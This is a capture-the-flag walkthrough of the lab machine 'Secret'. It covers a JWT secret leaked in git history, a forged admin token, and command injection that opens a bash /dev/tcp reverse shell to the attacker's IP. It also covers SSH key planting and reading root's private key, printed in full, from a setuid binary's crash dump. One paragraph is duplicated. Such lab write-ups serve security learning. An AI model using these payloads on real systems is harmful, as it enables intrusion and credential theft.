# Secret Writeup

![intro](assets/intro.png)

Target host: 10.10.11.120
Performed TCP portscan
```go
└──╼ $rustscan -a 10.10.11.120 -- -sV -sC -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/nath/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.120:22
Open 10.10.11.120:80
Open 10.10.11.120:3000
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -A" on ip 10.10.11.120
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-14 16:38 AEST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:38
Completed NSE at 16:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:38
Completed NSE at 16:38, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:38
Completed NSE at 16:38, 0.00s elapsed
Initiating Ping Scan at 16:38
Scanning 10.10.11.120 [2 ports]
Completed Ping Scan at 16:38, 0.32s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:38
Completed Parallel DNS resolution of 1 host. at 16:38, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 16:38
Scanning 10.10.11.120 [3 ports]
Discovered open port 80/tcp on 10.10.11.120
Discovered open port 22/tcp on 10.10.11.120
Discovered open port 3000/tcp on 10.10.11.120
Completed Connect Scan at 16:38, 0.43s elapsed (3 total ports)
Initiating Service scan at 16:38
Scanning 3 services on 10.10.11.120
Completed Service scan at 16:38, 12.12s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.11.120.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:38
Completed NSE at 16:38, 10.74s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:38
Completed NSE at 16:38, 1.60s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:38
Completed NSE at 16:38, 0.00s elapsed
Nmap scan report for 10.10.11.120
Host is up, received syn-ack (0.36s latency).
Scanned at 2023-04-14 16:38:27 AEST for 25s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBjDFc+UtqNVYIrxJx+2Z9ZGi7LtoV6vkWkbALvRXmFzqStfJ3UM7TuOcZcPd82vk0gFVN2/wjA3LUlbUlr7oSlD15DdJkr/XjYrZLJnG4NCxcAnbB5CIRaWmrrdGy5pJ/KgKr4UEVGDK+oAgE7wbv++el2WeD1DF8gw+GIHhtjrK1s0nfyNGcmGOwx8crtHB4xLpopAxWDr2jzMFMdGcIzZMRVLbe+TsG/8O/GFgNXU1WqFYGe4xl+MCmomjh9mUspf1WP2SRZ7V0kndJJxtRBTw6V+NQ/7EJYJPMeugOtbputyZMH+jALhzxBs07JLbw8Bh9JX+ZJl/j6VcIDfFRXxB7ceSe/cp4UYWcLqN+AsoE7k+uMCV6vmXYPNC3g5xfMMrDfVmGmrPbop0oPZUB3kr8iz5CI/qM61WI07/MME1uyM352WZHAJmeBLPAOy05ZBY+DgpVElkr0vVa+3UyKsF1dC3Qm2jisx/qh3sGauv1R8oXGHvy0+oeMOlJN+k=
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOL9rRkuTBwrdKEa+8VrwUjloHdmUdDR87hBOczK1zpwrsV/lXE1L/bYvDMUDVD0jE/aqMhekqNfBimt8aX53O0=
|   256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINM1K8Yufj5FJnBjvDzcr+32BQ9R/2lS/Mu33ExJwsci
80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: DUMB Docs
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
3000/tcp open  http    syn-ack Node.js (Express middleware)
|_http-title: DUMB Docs
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:38
Completed NSE at 16:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:38
Completed NSE at 16:38, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:38
Completed NSE at 16:38, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.39 seconds

```

Below is the index page of the http server open on port 80.
![1](assets/1.png)

Scrolling down a little further on the page there is a link that allows us to download the source code.
![2](assets/2.png)

## CodeReview
After extracting the zip archive and changing directory to `/routes`, there are 4 files `(auth.js, forgot.js, private.js, verifytoken.js)` that contain most of the logic for this web application.

### auth.js
Analyzing `auth.js`, we can see that the code logic performs the usual actions when creating an account. Eg: It receives a username, email, password and creates a hash.

![3](assets/3.png)

Whats interesting about this, is that when we scroll down a little, we can see that the application specifically uses JWT's for verification.
![4](assets/4.png)

For anyone unfamiliar with JSON Web Tokens (JWTs), are a standard format for sending signed cryptographically stored data between systems. JWTs are used for Access Control, Session Handling, and Authentication. They're also stored on the client machine rather than the server-side application. This can make it difficult for the server side to distinguish between legitimate and maliciously crafted JWTs.

JWTs also have a few weaknesses, in that they are encoded with a secret signing key. This secret key is what the client uses to generate a JWT token, and when the machine detects that the token follows the same signature as a token that was generated with the secret key, it concludes that the token is valid.

Similar authentication systems such as 2FA have a code that is generated from a secret key. If you can get your hands on the secret key, you can effectively create and sign your own token to bypass authentication, impersonate a legitimate user, and escalate privileges.

This [article](https://portswigger.net/web-security/jwt) by PortSwigger talks about other weaknesses with JWT such as bypassing the need for a secret key altogether by providing web applications with arbitrary values and unexpected encodings.

## private.js
Analyzing `private.js` shows that the web application can work out whether a user is an admin or not based on their name. Any user with the name `theadmin` can view and interact with the server in the /priv route.
![5](assets/5.png)

Scrolling a little further down, we can see a vulnerability in the code that practically gives the admin user the ability to remotely execute code. The function `exec()` is oddly being used to utilize Git to view log files on the command line and even offers a parameter (`file`) that the user can use to control what commands are executed and displayed on the screen.

![6](assets/6.png)

If the author wanted to fix the vulnerability, I would recommend removing the use of git and replace `exec` with some code that looks like the following.
```javascript
const fs = require('fs');

fs.readFile('/log/somePath', 'utf8', (err, data) => {
if (err) {
// Performed error handling.
}

for (const file in files) {
    // return json response.
}
```

Though this is a very simple example and may not fit all the requirements of the API, by removing external command line utilities and dangerous functions like `exec`, we remove the remote code execution vulnerability that practically gives attackers a free pass to do whatever they like on the system.

We have also removed control from the end user by removing the file parameter. This prevents the API from being used for purposes in which it was never designed or intended and stops the user from accessing sensitive information via other critical vulnerabilities such as Local File Inclusion (LFI).

## verifytoken.js
Analyzing this file shows that the secret is stored in the environment variables. This is obviously very useful on our part.

![7](assets/7.png)

## The Token Secret
As this application keeps hinting to the use of Git all through the code and even on the main index page, I wouldn't be entirely surprised to know if there is any juicy information hiding in the source code or the Git logs that would give us an indication on how to bypass authentication.

While searching through the source code for any information that might be useful, I found a hidden .git directory and a .env file.

The `.env` file contains the following.
```bash
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret
``` 

Though this information isn't very useful, the fact that there is a variable named TOKEN_SECRET hints to the fact that the secret key may have been stored in this file sometime in the past.

If we access the Git logs with `git log`, we should be able to view the commit history to the repository.

The screenshot below shows all the previous commits
![8](assets/8.png)

The commit highlighted in red mentions that .env was removed for security reasons. However, When we look inside this commit we find the secret key!
```bash
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret
```

Now that we've come this far, we can sign our own JWT to escalate privileges to admin.

## Reverse Shell
When we navigate to the /doc on pot 80, we are presented with some instructions on creating our user and logging in with the API.

With the following command, I use this to create my user.
```bash
curl -X POST http://10.10.11.120:3000/api/user/register -d '{"name":"liquidlegs","email":"liquidlegs@legs.com","password":"password"}' -H 'Content-Type: application/json'
```

Once completed this returns my username in a JSON response.

Next I login.
```bash
curl -X POST http://10.10.11.120:3000/api/user/login -d '{"email":"liquidlegs@legs.com","password":"password"}' -H 'Content-Type: application/json'
```

Once complete, this returns a JWT token.
```bash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NDNhMDY1NjhkNjk5YjA0NjMwMzY1ZjgiLCJuYW1lIjoibGlxdWlkbGVncyIsImVtYWlsIjoibGlxdWlkbGVnc0BsZWdzLmNvbSIsImlhdCI6MTY4MTU1MDkxOH0.UpRS67a8kPOZULnHJqnG9YAelGVt2U2GP6iMLR20Oao
```

While researching ways to sign my own JWT, I came across the following [site](https://jwt.io/).
![9](assets/9.png)

From here, I filled in the `name` field with `theadmin` and pasted the secret key under the `HMACSHA256` section. This generated a token which I used in the following request.
```bash
curl http://10.10.11.120:3000/api/priv -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NDM5NWM2ZDUyMjg0YjA0NWE2MTY2NTEiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImxpcXVpZGxlZ3NAbGVncy5jb20iLCJpYXQiOjE2ODE0ODE4ODh9.A83BNCKvy72pS2-pDU0NzrwLacJ_Oh_hdvaIw7cA1JA"
```

When I send the request above to `/api/priv` as the instructions say I should with the `auth-token` header, the application responds with the following JSON.
```json
{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}
```

When I navigate over to `api/logs` and enter the following command
```bash
curl -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NDM5NWM2ZDUyMjg0YjA0NWE2MTY2NTEiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImxpcXVpZGxlZ3NAbGVncy5jb20iLCJpYXQiOjE2ODE0ODE4ODh9.A83BNCKvy72pS2-pDU0NzrwLacJ_Oh_hdvaIw7cA1JA" "http://10.10.11.120:3000/api/logs?file=id"
``` 

We get a message from Git saying that it killed the process because the file did not exist. Giving Git what it expected, i tried again with `index.js` but I this time I added a semicolon and the `id` command to see if I could execute a binary after Git completed its desired action.
```bash
ab3e953 Added the codes\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\n
```

Success! Now we can use this to get a reverse shell.
After a bit of messing around, I managed to get a reverse shell with the following request.
```bash
curl -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NDM5NWM2ZDUyMjg0YjA0NWE2MTY2NTEiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImxpcXVpZGxlZ3NAbGVncy5jb20iLCJpYXQiOjE2ODE0ODE4ODh9.A83BNCKvy72pS2-pDU0NzrwLacJ_Oh_hdvaIw7cA1JA" "http://10.10.11.120/api/logs?file=index.js;%20bash%20-c%20'%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.5%2F4242%200%3E%261'"
```

After getting the reverse shell, we can see that we are loggedin as `dasith`
```bash
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
dasith:x:1000:1000:dasith:/home/dasith:/bin/bash
```

From here, as I was not able to find an ssh private key to login with, I decided to create my own.

On my own machine I entered the following
```bash
ssh-keygen -t rsa -b 4096 -C "liquidlegs" -P "" -f secret.key
```

Using the public key for my ssh key I just created, I can make a file at `/home/dasith/.ssh/authorized_keys` and paste my public key in it. Then I'll be able to use it to authenticate into the `secret.htb` ssh server.

Below are the commands I used to create the `authorized_keys` file on the victim machine.
```bash
bash-5.0$ mkdir .ssh
mkdir .ssh
bash-5.0$ cd .ssh
cd .ssh
bash-5.0$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDRU9c6lfI4yaUqNbG3GIerM4JBmRQN4YTy+VgLBXAGtph9xi0h2kxfVIzSDa5PGqnm4RXIEObzYFm2J0wu4ND1O+Y+B4XMXfXtSqAyzmpRdsaxampkKMknbtl1XkvQmbbn7cZBDm30gfMQDGRmIdN4frIb8gRQnjRZiCfCOZtMXHdLlASgQmhWHJX9SIitszrZP2ncQixY9VXq0tfhVLxFsVIA2y+xhHohiAJC+Ke/jIRfm/NQuY5sL5iVMltQdKoE5ofuHIAfywtSoT5qoPocQ/vO7Z6Jl4TNmmsf/JVeMRPzMDxiRZGMXvK50c+FV+dOCQudUEvjprKh6YCybINUzEd2bBHH1CjbGN1VVQ4UiPnu80GDumLKBrHC7Vw9dgomILsBex3UVl1ywczgo4/ZfpbIneUqhL2/XPtBF8VDGBvItfBblfvkD+XXfKXVD8NmZMAt8ANeGWQ6xydoT5lzQ3p+GLHS6V9lE+gUErty+gynp+Pql3aBVh9E/yAzjdfWFF+FBkiXKkU/omjOIcES+DlQLV5QndMvHx++AzKbAoPD+QKa3ZHXJGzBdflFMlEI/q8l2TntQg36KyTqz4c+amjmMbfb8iYceqEihmzd3hh4gDuOseM0FtV/Fhf1q9/+Usq7HkUmAs3so3pP0QRjgfWsZvAIRaigBEmjoXLu3w== liquidlegs
<HkUmAs3so3pP0QRjgfWsZvAIRaigBEmjoXLu3w== liquidlegs
> " > authorized_keys
```

I will just set my private key perms with `chmod 600 secret.key` and login with `ssh -i secret.key dasith@10.10.11.120`.

Success!
```bash
└──╼ $ssh -i secret.key dasith@10.10.11.120
The authenticity of host '10.10.11.120 (10.10.11.120)' can't be established.
ECDSA key fingerprint is SHA256:YNT38/psf6LrGXZJZYJVglUOKXjstxzWK5JJU7zzp3g.
Are you sure you want to continue connecting (yes/no/[fingerprint])? Yes
Warning: Permanently added '10.10.11.120' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 15 Apr 2023 04:30:37 AM UTC

  System load:           0.0
  Usage of /:            52.7% of 8.79GB
  Memory usage:          9%
  Swap usage:            0%
  Processes:             217
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.120
  IPv6 address for eth0: dead:beef::250:56ff:feb9:3118


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Sep  8 20:10:26 2021 from 10.10.1.168
```

Now that we've come this far, we can sign our own JWT to escalate privileges to admin.

## Reverse Shell
When we navigate to the /doc` on pot 80, we are presented with some instructions on creating our user and logging in with the API.

## Privilege Escalation
After logging into ssh I attempted enumerating the machine with `linpeas.sh` to see if the machine was vulnerable to any exploits or if credentials could be found.

The machine was found to be vulnerable to CVE-2021-4034, however, seeing that at the time of writing this walkthrough, it is the year 2023. I would rather escalate my privileges in a way that would teach me something.

Many of these older machines are all vulnerable to this CVE and I have exploited it many times already.

While searching around on the machine, I noticed in `/opt/` there is a binary named `count` with the 'S' permission assigned to it. Inside the same directory is the C source code that was used to compile the binary.

Without going into too much detail, I can already see that the vulnerability in this code is a buffer overflow. The Valgrind log is also a dead giveaway that this is quite possibly the intended vulnerability that we need to exploit to complete the box.

![10](assets/10.png)

However, as memory corruption bugs are not the easiest vulnerabilities to exploit, I'm going to take a slightly different route.

I noticed that when executing the `count` binary, it asks you to provide the path to a file or a directory. Rather than exploiting a buffer overflow, getting root permissions might be as simple as reading a file in the root directory and then providing input to the program that will make it crash.

Upon crashing, the program will create a crash log in `/var/crash` and dump its memory into a file. Since `count` has root permissions, we should be able to read the contents of any file that `count` reads when we dump its memory to a file.
```bash
Enter source file/directory name: /root/.ssh/id_rsa

Total characters = 2602
Total words      = 45
Total lines      = 39
Save results a file? [y/N]: ^Z
[1]+  Stopped                 ./count
dasith@secret:/opt$ ps
    PID TTY          TIME CMD
   1375 pts/0    00:00:00 bash
   1582 pts/0    00:00:00 count
   1583 pts/0    00:00:00 ps
dasith@secret:/opt$ kill -SIGSEGV 1582
dasith@secret:/opt$ fg
./count
Segmentation fault (core dumped)
```

In the output above I attempted to access the root users private key. After we extract the memory from the crash log we will see if we can find the private key.

Below are the commands I used to dump the process memory to a file.
```bash
dasith@secret:/opt$ cd /var/crash
dasith@secret:/var/crash$ ls
_opt_count.0.crash  _opt_count.1000.crash  _opt_countzz.0.crash
dasith@secret:/var/crash$ apport _opt_count.1000.crash /tmp/report
apport: command not found
dasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /tmp/report
dasith@secret:/var/crash$ cd /tmp/report
dasith@secret:/tmp/report$ ls
Architecture  Date           ExecutablePath       ProblemType  ProcCwd      ProcMaps    Signal  UserGroups
CoreDump      DistroRelease  ExecutableTimestamp  ProcCmdline  ProcEnviron  ProcStatus  Uname   _LogindSession
```

## Root Shell
Below is the output when we read the contents of the file named `CoreDump` with the `strings` utility.
```bash
Save results a file? [y/N]: l words      = 45
Total lines      = 39
/root/.ssh/id_rsa
E0Y;
T0Y;
`O0Y;
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Success! We got that private key we were after.
After writing the private key to a file and logging back into ssh, we can see that are indeed root!
```bash
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 15 Apr 2023 11:56:02 AM UTC

  System load:           0.0
  Usage of /:            52.7% of 8.79GB
  Memory usage:          9%
  Swap usage:            0%
  Processes:             213
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.120
  IPv6 address for eth0: dead:beef::250:56ff:feb9:64ae


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Oct 26 15:13:55 2021
root@secret:~# whoami
root
```